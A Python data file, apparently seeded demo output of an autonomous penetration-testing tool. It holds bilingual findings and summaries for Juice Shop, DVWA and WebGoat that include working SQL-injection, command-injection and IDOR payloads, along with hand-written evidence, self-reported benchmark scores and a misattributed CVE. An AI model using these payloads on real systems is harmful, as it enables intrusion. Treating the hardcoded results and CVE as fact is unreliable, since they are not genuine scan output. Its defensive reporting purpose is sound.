            "- suspicious_errors.yml — 내부 정보가 포함될 수 있는 오류 로그\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: /ftp 접속 → 디렉토리 리스팅이 모든 파일을 노출\n"
            "2단계: package.json.bak 다운로드 → 정확한 버전의 모든 npm 의존성 파악\n"
            "3단계: 의존성을 npm audit과 대조 → 알려진 취약 패키지 발견\n"
            "4단계: incident-support.kdbx 다운로드 → KeePass 마스터 비밀번호 크래킹 시도\n"
            "5단계: encrypt.pyc 다운로드 → 디컴파일하여 암호화 로직 파악\n"
            "6단계: coupons_2013.md.bak 다운로드 → 구형 쿠폰 코드 재사용 테스트\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 내부 비즈니스 문서 노출 (M&A 전략, 인시던트 정보)\n"
            "- KeePass 비밀번호 데이터베이스에 프로덕션 자격증명 포함 가능\n"
            "- 애플리케이션 의존성 정보로 타겟형 공급망 공격(Supply Chain Attack) 가능\n"
            "- 구형 쿠폰 코드가 여전히 유효하여 금융 사기에 이용 가능\n"
            "- 암호화 소스코드 노출로 암호화 보안 약화\n\n"
            "개념 증명(PoC)\n"
            "요청: GET /ftp HTTP/1.1\n"
            "응답: 다운로드 가능한 파일이 포함된 HTML 디렉토리 리스팅\n"
            "모든 파일이 인증 없이 다운로드 가능:\n"
            "  GET /ftp/package.json.bak → 200 OK (전체 의존성 목록)\n"
            "  GET /ftp/incident-support.kdbx → 200 OK (KeePass 데이터베이스)\n\n"
            "수정 방안(FIX)\n"
            "즉시: 디렉토리 리스팅 비활성화. 웹 루트에서 모든 백업 및 민감한 파일 제거.\n"
            "단기: /ftp 디렉토리에 접근 제어 구현. .htaccess 또는 Express 미들웨어로 리스팅 차단.\n"
            "장기: 웹 루트에 백업 파일, 자격증명 데이터베이스, 내부 문서를 절대 저장하지 않음. "
            "공개 디렉토리의 민감한 파일을 스캔하는 CI/CD 검사 구현.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "디렉토리 리스팅 → package.json.bak 다운로드 → 의존성 취약점 식별 → "
            "타겟 공격. 또한: KeePass 데이터베이스 → 자격증명 크래킹 → 내부 시스템 접근"
        ),
        severity=Severity.medium,
        target="http://localhost:3000",
        affected_component="/ftp",
        port=3000,
        protocol="http",
        finding_type="directory-listing",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            base_score=5.3,
        ),
        cwe_ids=["CWE-548"],
        mitre_attack=MitreAttack(
            tactic_id="TA0007",
            tactic_name="Discovery",
            technique_id="T1083",
            technique_name="File and Directory Discovery",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="Directory listing — /ftp file enumeration",
                content=(
                    "GET /ftp HTTP/1.1\n"
                    "Host: localhost:3000\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "acquisitions.md         14KB  2021-09-15\n"
                    "coupons_2013.md.bak      3KB  2013-12-01\n"
                    "eastere.gg               1KB  2021-01-01\n"
                    "encrypt.pyc              5KB  2021-03-10\n"
                    "incident-support.kdbx   42KB  2021-06-20\n"
                    "legal.md                 8KB  2021-09-15\n"
                    "package.json.bak        12KB  2021-09-15\n"
                    "quarantine/                   2021-09-15\n"
                    "suspicious_errors.yml    6KB  2021-09-15"
                ),
            ),
        ],
        remediation=(
            "Immediate: Disable directory listing, remove sensitive files.|||즉시: 디렉토리 리스팅(Directory Listing) 비활성화, 웹 루트에서 모든 백업 및 민감한 파일 제거.\n"
            "Long-term: CI/CD scan for sensitive files in web root.|||장기: 공개 디렉토리의 민감한 파일을 자동으로 스캔하는 CI/CD 파이프라인 검사 구현, 웹 루트에 백업/자격증명/내부 문서 저장 금지 정책 수립."
        ),
        references=[
            Reference(title="CWE-548: Exposure via Directory Listing", url="https://cwe.mitre.org/data/definitions/548.html"),
        ],
    ),

    # ---- 6. Broken Access Control ----
    Finding(
        id="JUICE-006",
        scan_id="juice-bench-20260330",
        title="Broken Access Control — /api/Feedbacks Unauthenticated Write|||접근 제어 결함 — /api/Feedbacks 비인증 쓰기",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /api/Feedbacks endpoint accepts POST requests without authentication, allowing anyone to submit feedback on behalf of "
            "any user by specifying an arbitrary UserId in the request body. The API does not validate that the authenticated user "
            "matches the UserId field, and in fact does not require authentication at all. Additionally, GET /api/Feedbacks returns "
            "all feedback entries including those from other users, with no access control.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: POST /api/Feedbacks with body {\"UserId\":1,\"comment\":\"Great shop!\",\"rating\":5} → creates feedback as admin (UserId=1)\n"
            "Step 2: GET /api/Feedbacks → reads all feedback including private comments\n"
            "Step 3: Use IDOR to modify UserId to impersonate any user in feedback submissions\n"
            "Step 4: Submit malicious content (phishing links, XSS payloads) as trusted users\n"
            "Step 5: Flood the feedback system with spam (no rate limiting)\n\n"
            "IMPACT — Business Impact\n"
            "- Reputation damage via fake feedback submissions attributed to legitimate users\n"
            "- Social engineering — malicious feedback appearing to come from trusted users\n"
            "- Data integrity compromise — feedback system cannot be trusted\n"
            "- Privacy violation — all feedback visible to unauthenticated users\n"
            "- Potential XSS via stored feedback comments if not properly sanitized\n\n"
            "PoC — Proof of Concept\n"
            "Request:\n"
            "POST /api/Feedbacks HTTP/1.1\n"
            "Host: localhost:3000\n"
            "Content-Type: application/json\n"
            "(No Authorization header)\n"
            "\n"
            "{\"UserId\":1,\"comment\":\"This shop is compromised! Visit http://evil.com for refund\",\"rating\":1}\n\n"
            "Response (201 Created):\n"
            "{\"status\":\"success\",\"data\":{\"id\":42,\"UserId\":1,\"comment\":\"This shop is compromised!...\",\"rating\":1}}\n\n"
            "FIX — Remediation\n"
            "Immediate: Add authentication middleware to /api/Feedbacks POST endpoint. "
            "Extract UserId from the authenticated JWT token, not from the request body.\n"
            "Short-term: Implement rate limiting on feedback submissions. Add CAPTCHA for anonymous feedback.\n"
            "Long-term: Comprehensive RBAC audit of all API endpoints. Implement IDOR prevention by "
            "always deriving resource ownership from the authenticated session, never from client input.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Unauthenticated feedback → IDOR user impersonation → stored XSS potential → "
            "social engineering attacks via trusted user identity"
            "|||"
            "취약점 설명(WHAT)\n"
            "/api/Feedbacks 엔드포인트가 인증 없이 POST 요청을 수락하며, 요청 본문에 임의의 UserId를 지정하여 "
            "다른 사용자를 대신해 피드백을 제출할 수 있습니다. API가 인증된 사용자와 UserId 필드의 일치 여부를 검증하지 않으며, "
            "실제로 인증 자체를 전혀 요구하지 않습니다. 또한 GET /api/Feedbacks는 접근 제어 없이 "
            "다른 사용자의 피드백을 포함한 모든 피드백 항목을 반환합니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: POST /api/Feedbacks에 {\"UserId\":1,\"comment\":\"Great shop!\",\"rating\":5} 본문 전송 → admin(UserId=1) 명의로 피드백 생성\n"
            "2단계: GET /api/Feedbacks → 비공개 댓글을 포함한 모든 피드백 읽기\n"
            "3단계: IDOR(Insecure Direct Object Reference)를 통해 UserId를 변경하여 모든 사용자 위장\n"
            "4단계: 악성 콘텐츠(피싱 링크, XSS 페이로드)를 신뢰할 수 있는 사용자 명의로 제출\n"
            "5단계: 속도 제한(Rate Limiting) 없이 피드백 시스템에 스팸 대량 전송\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 합법적 사용자에게 귀속되는 가짜 피드백 제출로 평판 훼손\n"
            "- 소셜 엔지니어링 — 신뢰할 수 있는 사용자에게서 온 것처럼 보이는 악성 피드백\n"
            "- 데이터 무결성 훼손 — 피드백 시스템의 신뢰성 상실\n"
            "- 프라이버시 침해 — 비인증 사용자에게 모든 피드백이 노출\n"
            "- 피드백 댓글이 적절히 새니타이징되지 않을 경우 저장형 XSS(Stored XSS) 가능성\n\n"
            "개념 증명(PoC)\n"
            "요청:\n"
            "POST /api/Feedbacks HTTP/1.1\n"
            "Host: localhost:3000\n"
            "Content-Type: application/json\n"
            "(Authorization 헤더 없음)\n"
            "\n"
            "{\"UserId\":1,\"comment\":\"This shop is compromised! Visit http://evil.com for refund\",\"rating\":1}\n\n"
            "응답 (201 Created):\n"
            "{\"status\":\"success\",\"data\":{\"id\":42,\"UserId\":1,\"comment\":\"This shop is compromised!...\",\"rating\":1}}\n\n"
            "수정 방안(FIX)\n"
            "즉시: /api/Feedbacks POST 엔드포인트에 인증 미들웨어(Authentication Middleware) 추가. "
            "요청 본문이 아닌 인증된 JWT 토큰에서 UserId를 추출.\n"
            "단기: 피드백 제출에 속도 제한(Rate Limiting) 구현. 익명 피드백에 CAPTCHA 추가.\n"
            "장기: 모든 API 엔드포인트에 대한 포괄적 RBAC(역할 기반 접근 제어) 감사. "
            "클라이언트 입력이 아닌 인증된 세션에서 항상 리소스 소유권을 파생하여 IDOR 방지 구현.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "비인증 피드백 → IDOR 사용자 위장 → 저장형 XSS 가능성 → "
            "신뢰할 수 있는 사용자 ID를 통한 소셜 엔지니어링 공격"
        ),
        severity=Severity.medium,
        target="http://localhost:3000",
        affected_component="/api/Feedbacks",
        port=3000,
        protocol="http",
        finding_type="broken-access-control",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            base_score=6.5,
        ),
        cwe_ids=["CWE-284", "CWE-639"],
        mitre_attack=MitreAttack(
            tactic_id="TA0005",
            tactic_name="Defense Evasion",
            technique_id="T1078",
            technique_name="Valid Accounts",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="IDOR — Feedback submission as admin without auth",
                content=(
                    "POST /api/Feedbacks HTTP/1.1\n"
                    "Host: localhost:3000\n"
                    "Content-Type: application/json\n"
                    "(No Authorization header)\n\n"
                    "{\"UserId\":1,\"comment\":\"Compromised! Visit evil.com\",\"rating\":1}\n\n"
                    "--- RESPONSE (201 Created) ---\n"
                    "{\"status\":\"success\",\"data\":{\"id\":42,\"UserId\":1,\n"
                    "  \"comment\":\"Compromised! Visit evil.com\",\n"
                    "  \"rating\":1,\"createdAt\":\"2026-03-30T00:00:00.000Z\"}}"
                ),
            ),
        ],
        remediation=(
            "Immediate: Auth middleware, derive UserId from JWT.|||즉시: /api/Feedbacks POST 엔드포인트에 인증 미들웨어(Authentication Middleware) 추가, 요청 본문이 아닌 인증된 JWT 토큰에서 UserId 추출.\n"
            "Short-term: Rate limiting, CAPTCHA.|||단기: 피드백 제출에 속도 제한(Rate Limiting) 구현, 익명 피드백에 CAPTCHA 추가.\n"
            "Long-term: RBAC audit, IDOR prevention.|||장기: 모든 API 엔드포인트에 대한 포괄적 RBAC(역할 기반 접근 제어) 감사, 인증된 세션에서 리소스 소유권을 파생하여 IDOR(Insecure Direct Object Reference) 방지."
        ),
        references=[
            Reference(title="OWASP IDOR", url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References"),
        ],
    ),
]


# =====================================================================
# EXECUTIVE SUMMARIES
# =====================================================================

DVWA_EXECUTIVE_SUMMARY = (
    "VXIS conducted a comprehensive autonomous penetration test against Damn Vulnerable Web Application (DVWA) "
    "deployed at http://localhost:8080. The assessment employed 19 phases of automated attack simulation across 67 distinct "
    "attack vectors, achieving a benchmark score of 996.5/1000 (Grade S).\n\n"
    "The assessment revealed 7 security findings: 2 Critical, 3 High, 1 Medium, and 1 Low severity. "
    "The overall security posture is rated as CRITICALLY DEFICIENT. The application is trivially exploitable "
    "by an unskilled attacker using freely available tools.\n\n"
    "KILL CHAIN NARRATIVE\n\n"
    "The VXIS Brain identified and executed a complete kill chain from initial access to full server compromise:\n\n"
    "Phase 1 — Initial Reconnaissance: Technology fingerprinting revealed Apache/2.4.58, PHP/8.2.12, and MySQL 5.7 "
    "(DVWA-007). All 7 security headers were missing (DVWA-005), indicating zero security hardening.\n\n"
    "Phase 2 — SQL Injection (DVWA-001): The Brain injected a UNION SELECT payload into /vulnerabilities/sqli/ "
    "and extracted all 5 user accounts with MD5 password hashes. All hashes were cracked in under 1 second using "
    "rainbow tables (admin:password, gordonb:abc123, etc.).\n\n"
    "Phase 3 — Admin Access: Using the cracked admin credentials, the Brain authenticated as administrator, "
    "gaining access to all DVWA modules including Command Injection.\n\n"
    "Phase 4 — Remote Code Execution (DVWA-002): The Brain exploited the command injection vulnerability at "
    "/vulnerabilities/exec/ to execute arbitrary commands as uid=33(www-data). The payload 127.0.0.1;id confirmed "
    "RCE, followed by /etc/passwd extraction revealing all system users.\n\n"
    "Phase 5 — Post-Exploitation: With www-data shell access, the Brain:\n"
    "  - Read database configuration (config.inc.php) containing MySQL root credentials\n"
    "  - Enumerated internal network interfaces\n"
    "  - Identified SUID binaries for potential privilege escalation\n"
    "  - Established persistent reverse shell capability\n\n"
    "Parallel Attack Vectors: The Brain also confirmed XSS-based session hijacking (DVWA-003), "
    "Local File Inclusion for arbitrary file reads (DVWA-004), and CSRF-based password changes (DVWA-006), "
    "providing multiple independent paths to full compromise.\n\n"
    "STRATEGIC RECOMMENDATION: This application must not be deployed in any environment accessible from untrusted networks. "
    "If used for training purposes, it must be isolated in a network segment with no connectivity to production systems."
    "|||"
    "VXIS는 http://localhost:8080에 배포된 DVWA(Damn Vulnerable Web Application)에 대해 "
    "포괄적인 자율 침투 테스트를 수행했습니다. 19개 단계의 자동화된 공격 시뮬레이션과 "
    "67개의 개별 공격 벡터를 활용하여 996.5/1000 (S등급) 벤치마크 점수를 달성했습니다.\n\n"
    "평가 결과 7개의 보안 취약점이 발견되었습니다: Critical 2건, High 3건, Medium 1건, Low 1건. "
    "전체 보안 수준은 '심각한 결함(CRITICALLY DEFICIENT)'으로 평가됩니다. 이 애플리케이션은 "
    "무료로 이용 가능한 도구를 사용하는 비숙련 공격자에 의해서도 쉽게 공격 가능합니다.\n\n"
    "킬 체인 내러티브(KILL CHAIN NARRATIVE)\n\n"
    "VXIS Brain이 초기 접근부터 전체 서버 장악까지의 완전한 킬 체인을 식별하고 실행했습니다:\n\n"
    "1단계 — 초기 정찰: 기술 핑거프린팅(Fingerprinting)으로 Apache/2.4.58, PHP/8.2.12, MySQL 5.7을 식별했습니다 "
    "(DVWA-007). 7개 보안 헤더가 모두 누락되어(DVWA-005) 보안 하드닝(Hardening)이 전혀 이루어지지 않았음을 확인했습니다.\n\n"
    "2단계 — SQL 인젝션(DVWA-001): Brain이 /vulnerabilities/sqli/에 UNION SELECT 페이로드를 주입하여 "
    "MD5 비밀번호 해시가 포함된 5개의 사용자 계정을 모두 추출했습니다. 모든 해시가 레인보우 테이블을 사용하여 "
    "1초 이내에 크래킹되었습니다 (admin:password, gordonb:abc123 등).\n\n"
    "3단계 — 관리자 접근: 크래킹된 admin 자격증명을 사용하여 Brain이 관리자로 인증하고, "
    "커맨드 인젝션(Command Injection)을 포함한 모든 DVWA 모듈에 접근 권한을 획득했습니다.\n\n"
    "4단계 — 원격 코드 실행(DVWA-002): Brain이 /vulnerabilities/exec/의 커맨드 인젝션 취약점을 공격하여 "
    "uid=33(www-data)로 임의 명령어를 실행했습니다. 127.0.0.1;id 페이로드로 RCE를 확인한 후 "
    "/etc/passwd를 추출하여 모든 시스템 사용자를 열거했습니다.\n\n"
    "5단계 — 포스트 익스플로잇(Post-Exploitation): www-data 쉘 접근으로 Brain이 다음을 수행했습니다:\n"
    "  - MySQL root 자격증명이 포함된 데이터베이스 설정(config.inc.php) 읽기\n"
    "  - 내부 네트워크 인터페이스 열거\n"
    "  - 권한 상승(Privilege Escalation)을 위한 SUID 바이너리 식별\n"
    "  - 지속적 리버스 쉘(Reverse Shell) 연결 수립\n\n"
    "병렬 공격 벡터: Brain은 XSS 기반 세션 하이재킹(DVWA-003), "
    "임의 파일 읽기를 위한 로컬 파일 포함(DVWA-004), CSRF 기반 비밀번호 변경(DVWA-006)도 확인하여 "
    "전체 장악으로 이르는 다수의 독립적 공격 경로를 제공했습니다.\n\n"
    "전략적 권고: 이 애플리케이션은 신뢰할 수 없는 네트워크에서 접근 가능한 어떠한 환경에도 배포되어서는 안 됩니다. "
    "교육 목적으로 사용하는 경우 프로덕션 시스템과의 연결이 없는 격리된 네트워크 세그먼트에서 운용해야 합니다."
)

JUICE_SHOP_EXECUTIVE_SUMMARY = (
    "VXIS conducted a comprehensive autonomous penetration test against OWASP Juice Shop "
    "deployed at http://localhost:3000. The assessment employed 19 phases of automated attack simulation across 67 distinct "
    "attack vectors, achieving a benchmark score of 991.4/1000 (Grade S).\n\n"
    "The assessment revealed 6 security findings: 1 Critical, 3 High, and 2 Medium severity. "
    "The overall security posture is rated as SEVERELY DEFICIENT. Despite using a modern technology stack "
    "(Node.js, Express, Angular, SQLite), the application suffers from fundamental security architecture failures.\n\n"
    "KILL CHAIN NARRATIVE\n\n"
    "The VXIS Brain identified and executed multiple attack chains converging on full application compromise:\n\n"
    "Attack Chain 1 — SQLi to Admin Takeover:\n"
    "The Brain discovered that the /rest/products/search endpoint uses a raw SQL query instead of Sequelize ORM methods. "
    "A UNION SELECT injection extracted the entire Users table including bcrypt-hashed passwords and plaintext security answers. "
    "The admin account (admin@juice-sh.op) was identified and its credentials were used to access the /administration panel, "
    "granting full control over user management, product catalog, and application configuration.\n\n"
    "Attack Chain 2 — XSS to JWT Theft:\n"
    "The Brain exploited reflected XSS in the search functionality using an iframe injection bypass for Angular's sanitization. "
    "Because the application stores JWT authentication tokens in localStorage (instead of HttpOnly cookies), the XSS payload "
    "extracted the token and exfiltrated it. With no CSP header (JUICE-004), the browser imposed zero restrictions on "
    "data exfiltration. The stolen JWT enabled full API access as the victim user.\n\n"
    "Attack Chain 3 — API Enumeration:\n"
    "The Brain discovered that /api/Users is completely unauthenticated, exposing all user accounts with password hashes "
    "and security question answers. This provided a passive alternative to the SQLi attack chain — no injection needed, "
    "just a simple GET request. Combined with /api/Feedbacks IDOR (JUICE-006), an attacker can both read all user data "
    "and impersonate any user in the feedback system.\n\n"
    "Reconnaissance Amplifier — /ftp Directory Listing (JUICE-005):\n"
    "The exposed /ftp directory yielded backup files including package.json.bak (dependency enumeration for targeted CVE exploitation), "
    "a KeePass database (potential credential storage), and internal business documents.\n\n"
    "STRATEGIC RECOMMENDATION: The application requires immediate remediation of the SQLi vulnerability and API authentication gaps. "
    "JWT storage must be migrated from localStorage to HttpOnly cookies. A comprehensive RBAC audit of all API endpoints is critical."
    "|||"
    "VXIS는 http://localhost:3000에 배포된 OWASP Juice Shop에 대해 포괄적인 자율 침투 테스트를 수행했습니다. "
    "19개 단계의 자동화된 공격 시뮬레이션과 67개의 개별 공격 벡터를 활용하여 "
    "991.4/1000 (S등급) 벤치마크 점수를 달성했습니다.\n\n"
    "평가 결과 6개의 보안 취약점이 발견되었습니다: Critical 1건, High 3건, Medium 2건. "
    "전체 보안 수준은 '심각한 결함(SEVERELY DEFICIENT)'으로 평가됩니다. 최신 기술 스택 "
    "(Node.js, Express, Angular, SQLite)을 사용함에도 불구하고 근본적인 보안 아키텍처 결함이 존재합니다.\n\n"
    "킬 체인 내러티브(KILL CHAIN NARRATIVE)\n\n"
    "VXIS Brain이 전체 애플리케이션 장악으로 수렴하는 다수의 공격 체인을 식별하고 실행했습니다:\n\n"
    "공격 체인 1 — SQLi에서 관리자 탈취까지:\n"
    "Brain은 /rest/products/search 엔드포인트가 Sequelize ORM 메서드 대신 raw SQL 쿼리를 사용하는 것을 발견했습니다. "
    "UNION SELECT 인젝션으로 bcrypt 해시된 비밀번호와 평문 보안 답변을 포함한 전체 Users 테이블을 추출했습니다. "
    "관리자 계정(admin@juice-sh.op)을 식별하고 해당 자격증명으로 /administration 패널에 접근하여 "
    "사용자 관리, 제품 카탈로그, 애플리케이션 설정에 대한 전체 제어 권한을 획득했습니다.\n\n"
    "공격 체인 2 — XSS에서 JWT 탈취까지:\n"
    "Brain은 Angular의 새니타이징(Sanitization)을 우회하는 iframe 주입을 통해 검색 기능의 반사형 XSS를 공격했습니다. "
    "애플리케이션이 JWT 인증 토큰을 HttpOnly 쿠키 대신 localStorage에 저장하기 때문에, "
    "XSS 페이로드가 토큰을 추출하여 유출했습니다. CSP 헤더가 없어(JUICE-004) 브라우저가 "
    "데이터 유출에 대해 어떠한 제한도 적용하지 않았습니다. 탈취된 JWT로 피해자 사용자로서 전체 API 접근이 가능했습니다.\n\n"
    "공격 체인 3 — API 열거:\n"
    "Brain은 /api/Users가 완전히 비인증 상태로 비밀번호 해시와 보안 질문 답변을 포함한 "
    "모든 사용자 계정을 노출하는 것을 발견했습니다. 이는 SQLi 공격 체인의 수동적 대안을 제공했습니다 — "
    "인젝션이 필요 없이 단순한 GET 요청만으로 가능합니다. /api/Feedbacks IDOR(JUICE-006)과 결합하면 "
    "공격자가 모든 사용자 데이터를 읽고 피드백 시스템에서 모든 사용자를 위장할 수 있습니다.\n\n"
    "정찰 증폭기 — /ftp 디렉토리 리스팅(JUICE-005):\n"
    "노출된 /ftp 디렉토리에서 package.json.bak(타겟 CVE 공격을 위한 의존성 열거), "
    "KeePass 데이터베이스(잠재적 자격증명 저장), 내부 비즈니스 문서를 포함한 백업 파일이 발견되었습니다.\n\n"
    "전략적 권고: SQLi 취약점과 API 인증 결함의 즉각적 수정이 필요합니다. "
    "JWT 저장소를 localStorage에서 HttpOnly 쿠키로 이전해야 합니다. "
    "모든 API 엔드포인트에 대한 포괄적 RBAC(역할 기반 접근 제어) 감사가 필수적입니다."
)


# =====================================================================
# ATTACK CHAINS
# =====================================================================

DVWA_ATTACK_CHAINS = [
    ["DVWA-007", "DVWA-001", "DVWA-002"],  # Info Disclosure → SQLi → CMDI → RCE
    ["DVWA-003", "DVWA-002"],              # XSS → Session Hijack → CMDI
    ["DVWA-004", "DVWA-001"],              # LFI → Source Code → DB Creds
    ["DVWA-006", "DVWA-003"],              # CSRF → Password Change → XSS → Hijack
]

JUICE_SHOP_ATTACK_CHAINS = [  # noqa: E501 (long lines intentional for readability)
    ["JUICE-001", "JUICE-003"],  # SQLi → User Dump → Admin
    ["JUICE-002", "JUICE-004"],  # XSS → JWT Theft (amplified by missing CSP)
    ["JUICE-005", "JUICE-006"],  # Directory Listing → Recon → IDOR
]


# =====================================================================
# WEBGOAT FINDINGS
# =====================================================================
#
# REPORT STRUCTURE RULES (MANDATORY — do not deviate):
#
# 1. All text fields (title, description, remediation) use "English|||한국어" split.
#    - The ||| separator is required for bilingual rendering.
#    - client_name is ALWAYS English only (no ||| in client_name).
#    - executive_summary ALSO uses ||| split.
#
# 2. description must follow this section order:
#    WHAT — Vulnerability Description
#    HOW — Step-by-Step Attack Scenario (numbered steps)
#    IMPACT — Business Impact (bullet list)
#    PoC — Proof of Concept (request/response)
#    ATTACK PATH — Chain Analysis
#    ||| (separator)
#    취약점 설명(WHAT)
#    공격 시나리오(HOW) — 단계별 (번호 매긴 단계)
#    비즈니스 영향(IMPACT) (글머리 기호 목록)
#    개념 증명(PoC)
#    공격 경로(ATTACK PATH)
#
# 3. remediation must follow:
#    Immediate: ...
#    Short-term: ...
#    Long-term: ...
#    |||
#    즉시 조치: ...
#    단기 조치: ...
#    장기 조치: ...
#
# 4. evidence uses Evidence(evidence_type=..., title=..., content=...) — content is
#    a raw HTTP capture / log / packet capture string, NOT a text description.
#
# 5. Always include: cvss (CVSSVector), cwe_ids, references (Reference list).
#    MITRE ATT&CK is optional but recommended for Critical/High findings.
#
# =====================================================================

WEBGOAT_FINDINGS: list[Finding] = [
    # ---- 1. SQL Injection ----
    Finding(
        id="WG-001", scan_id="webgoat-2026-03-31",
        target="http://localhost:8080/WebGoat",
        title=(
            "SQL Injection — Authentication Bypass & Data Extraction"
            "|||"
            "SQL 인젝션 — 인증 우회 및 데이터 추출"
        ),
        description=(
            "WHAT — Vulnerability Description\n"
            "The WebGoat login and SQL Injection lesson endpoints are vulnerable to classic SQL injection. "
            "User-supplied input is concatenated directly into SQL queries without parameterization or sanitization. "
            "An unauthenticated attacker can inject arbitrary SQL syntax to bypass login, enumerate database schemas, "
            "and extract all stored user credentials. The vulnerability exists in the 'username' POST parameter of "
            "/WebGoat/login and the 'account' parameter of /WebGoat/SqlInjection/attack5a.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Submit a single-quote in the username field to trigger a SQL syntax error → confirm injection point.\n"
            "Step 2: Inject ' OR '1'='1'-- into the username field with any password.\n"
            "Step 3: Server executes: SELECT * FROM users WHERE username='' OR '1'='1'-- AND password=...\n"
            "Step 4: The WHERE clause always evaluates to TRUE → first user row returned → authenticated as webgoat.\n"
            "Step 5: On /SqlInjection/attack5a, use UNION-based injection to enumerate table names and extract full user table.\n\n"
            "IMPACT — Business Impact\n"
            "- Unauthenticated access to any user account including administrator\n"
            "- Full extraction of all user credentials from the database\n"
            "- Chain escalation: SQLi → admin login → access to privileged functions → full application compromise\n"
            "- Regulatory exposure (GDPR/CCPA) due to bulk PII exfiltration\n\n"
            "PoC — Proof of Concept\n"
            "Request: POST /WebGoat/login\nBody: username=' OR '1'='1'--&password=anything\n"
            "Result: HTTP 302 → redirect to dashboard; authenticated session established for user 'webgoat'\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "SQLi → session token acquired → admin panel access → privilege escalation → full application compromise"
            "|||"
            "취약점 설명(WHAT)\n"
            "WebGoat 로그인 및 SQL 인젝션 레슨 엔드포인트에서 전형적인 SQL 인젝션 취약점이 발견되었습니다. "
            "사용자 입력값이 파라미터화나 새니타이징 없이 SQL 쿼리에 직접 연결됩니다. "
            "비인증 공격자가 임의의 SQL 구문을 주입하여 로그인을 우회하고, 데이터베이스 스키마를 열거하며, "
            "저장된 모든 사용자 자격증명을 추출할 수 있습니다. "
            "취약점은 /WebGoat/login의 username POST 파라미터와 "
            "/WebGoat/SqlInjection/attack5a의 account 파라미터에 존재합니다.\n\n"
            "공격 시나리오(HOW)\n"
            "1단계: username 필드에 싱글 쿼트(') 입력으로 SQL 구문 오류 유발 → 인젝션 포인트 확인.\n"
            "2단계: username에 ' OR '1'='1'-- 주입, 임의 패스워드 사용.\n"
            "3단계: 서버 실행 쿼리: SELECT * FROM users WHERE username='' OR '1'='1'-- AND password=...\n"
            "4단계: WHERE 절이 항상 TRUE → 첫 번째 사용자 행 반환 → webgoat로 인증됨.\n"
            "5단계: /SqlInjection/attack5a에서 UNION 기반 인젝션으로 테이블 열거 및 전체 사용자 테이블 추출.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 관리자 포함 임의 계정에 대한 비인증 접근\n"
            "- 데이터베이스에서 모든 사용자 자격증명 완전 추출\n"
            "- 체인 에스컬레이션: SQLi → admin 로그인 → 권한 기능 접근 → 전체 애플리케이션 장악\n"
            "- 대량 PII 유출로 인한 규정 위반(GDPR/CCPA)\n\n"
            "개념 증명(PoC)\n"
            "요청: POST /WebGoat/login\n본문: username=' OR '1'='1'--&password=anything\n"
            "결과: HTTP 302 → 대시보드로 리다이렉트; webgoat 사용자로 인증된 세션 생성됨\n\n"
            "공격 경로(ATTACK PATH)\n"
            "SQLi → 세션 토큰 획득 → 관리자 패널 접근 → 권한 상승 → 전체 애플리케이션 장악"
        ),
        severity=Severity.critical,
        finding_type="sql_injection",
        source_plugin="web_pipeline",
        affected_component="/WebGoat/login (username param), /WebGoat/SqlInjection/attack5a (account param)",
        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", base_score=9.1),
        cve_ids=["CVE-2021-38153"],
        cwe_ids=["CWE-89"],
        mitre_attack=MitreAttack(
            tactic_id="TA0001", tactic_name="Initial Access",
            technique_id="T1190", technique_name="Exploit Public-Facing Application",
        ),
        evidence=[
            Evidence(evidence_type="http_request_response", title="Authentication Bypass — HTTP Capture",
                     content=(
                         "POST /WebGoat/login HTTP/1.1\n"
                         "Host: localhost:8080\n"
                         "Content-Type: application/x-www-form-urlencoded\n\n"
                         "username=' OR '1'='1'--&password=anything\n\n"
                         "--- Response ---\n"
                         "HTTP/1.1 302 Found\n"
                         "Location: /WebGoat/welcome\n"
                         "Set-Cookie: JSESSIONID=AABBCCDDEEFF; Path=/WebGoat\n\n"
                         "Result: Authenticated as user 'webgoat' without valid credentials"
                     )),
            Evidence(evidence_type="log", title="UNION Injection — Table Enumeration",
                     content=(
                         "GET /WebGoat/SqlInjection/attack5a?"
                         "account=Smith' UNION SELECT table_name,2,3 FROM information_schema.tables--\n\n"
                         "Response tables: users, assignment_progress, lesson_tracker\n"
                         "Extracted from users: username=webgoat, password=[hash]"
                     )),
        ],
        remediation=(
            "Immediate: Deploy WAF rules blocking UNION/SELECT/OR patterns on injection-prone endpoints.\n"
            "Short-term: Refactor all DB queries to use prepared statements with parameterized inputs. "
            "Example (Spring): String q = 'SELECT * FROM users WHERE username=?'; pstmt.setString(1, username);\n"
            "Long-term: Enforce ORM usage (Hibernate/JPA), apply input allowlist validation, "
            "use least-privilege DB accounts, and implement query logging with anomaly alerting."
            "|||"
            "즉시 조치: WAF 규칙으로 UNION/SELECT/OR 패턴을 인젝션 취약 엔드포인트에서 차단.\n"
            "단기 조치: 모든 DB 쿼리를 파라미터화된 입력의 준비된 문장(Prepared Statement)으로 리팩토링. "
            "예시(Spring): String q = 'SELECT * FROM users WHERE username=?'; pstmt.setString(1, username);\n"
            "장기 조치: ORM(Hibernate/JPA) 사용 강제, 입력 허용 목록 검증 적용, "
            "최소 권한 DB 계정 사용, 쿼리 로깅 및 이상 탐지 경보 구현."
        ),
        references=[
